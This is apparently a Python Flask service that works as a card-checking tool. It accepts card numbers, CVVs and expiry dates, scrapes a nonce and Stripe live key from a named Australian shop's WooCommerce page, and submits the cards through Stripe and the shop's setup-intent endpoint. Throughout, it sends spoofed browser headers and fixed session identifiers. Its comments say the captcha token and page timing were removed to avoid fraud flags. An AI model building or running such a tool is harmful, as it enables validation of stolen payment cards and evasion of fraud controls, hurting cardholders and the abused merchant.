from flask import Flask, request, jsonify
import requests
from bs4 import BeautifulSoup
import re
import json

app = Flask(__name__)

@app.route('/add_payment_method', methods=['POST'])
def add_payment_method():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data provided'}), 400

        cc = data.get('cc')
        cvv = data.get('cvv')
        mm = data.get('mm')
        yy = data.get('yy')
        page_cookies = data.get('cookies', {})  # Expect cookies as dict in JSON

        if not all([cc, cvv, mm, yy]):
            return jsonify({'error': 'Missing required fields: cc, cvv, mm, yy'}), 400

        # First, fetch the page to extract the nonce and PK
        page_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Upgrade-Insecure-Requests': '1',
        }

        page_response = requests.get('https://playpadel.com.au/shop/my-account/add-payment-method/', cookies=page_cookies, headers=page_headers)
        if page_response.status_code != 200:
            return jsonify({'error': f'Failed to fetch page: {page_response.status_code}'}), 500

        soup = BeautifulSoup(page_response.text, 'html.parser')

        ajax_nonce = None
        pk = None

        # Extract the nonce from the hidden input
        nonce_input = soup.find('input', {'name': '_ajax_nonce'})
        if nonce_input:
            ajax_nonce = nonce_input.get('value')
        else:
            # Fallback: search the entire page text for the specific nonce key
            text = page_response.text
            # Try single quotes
            nonce_match = re.search(r"'createAndConfirmSetupIntentNonce'\s*:\s*'([^']+)'", text)
            if nonce_match:
                ajax_nonce = nonce_match.group(1)
            else:
                # Try double quotes
                nonce_match = re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"', text)
                if nonce_match:
                    ajax_nonce = nonce_match.group(1)

        # Extract the Stripe public key from the page
        pk_match = re.search(r"['\"](pk_live_[a-zA-Z0-9]+)['\"]", page_response.text)
        if pk_match:
            pk = pk_match.group(1)
        else:
            # Fallback: try parsing wc_stripe_params as JSON
            text = page_response.text
            match = re.search(r'wc_stripe_params\s*=\s*({.*?});?', text, re.DOTALL)
            if match:
                params_str = match.group(1)
                try:
                    params = json.loads(params_str)
                    pk = params.get('key') or params.get('publishable_key')
                except json.JSONDecodeError:
                    pass

        if not ajax_nonce:
            return jsonify({'error': 'Could not extract nonce'}), 500

        if not pk:
            return jsonify({'error': 'Could not extract Stripe public key'}), 500

        # Now proceed with the original Stripe payment method creation
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        }

        # Fixed data: removed the radar_options[hcaptcha_token] to avoid fraud flags from invalid/expired token
        # Also removed time_on_page as it's suspiciously high
        # Use extracted pk
        data_str = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2F90ba939846%3B+stripe-js-v3%2F90ba939846%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fplaypadel.com.au&client_attribution_metadata[client_session_id]=8d4c0e26-a869-4165-9afe-76ac79593a68&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=5d36587f-0040-446c-a1e3-555fba734f32&guid=6d6f140b-8c1a-4254-b262-5dc602a569c080d449&muid=856ff4e9-8860-4881-82c7-fd6d5638803bacebfa&sid=fa68be13-284d-4134-a213-ac7c8fb4995a904bc2&key={pk}&_stripe_version=2024-06-20'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data_str)
        if response.status_code != 200:
            return jsonify({'error': f'Stripe API error: {response.status_code}', 'response': response.text}), 500

        pm_id = response.json()
        payment_method_id = pm_id.get("id")
        if not payment_method_id:
            return jsonify({'error': 'Failed to create payment method'}), 500

        # Now the AJAX call with dynamic nonce
        ajax_headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://playpadel.com.au',
            'Referer': 'https://playpadel.com.au/shop/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_wpnonce': ajax_nonce,
        }

        ajax_response = requests.post('https://playpadel.com.au/wp-admin/admin-ajax.php', cookies=page_cookies, headers=ajax_headers, data=ajax_data)
        if ajax_response.status_code != 200:
            return jsonify({'error': f'AJAX call failed: {ajax_response.status_code}', 'response': ajax_response.text}), 500

        ajax_result = ajax_response.json() if ajax_response.text.startswith('{') else {'raw': ajax_response.text}

        return jsonify({
            'success': True,
            'payment_method_id': payment_method_id,
            'ajax_response': ajax_result
        })

    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
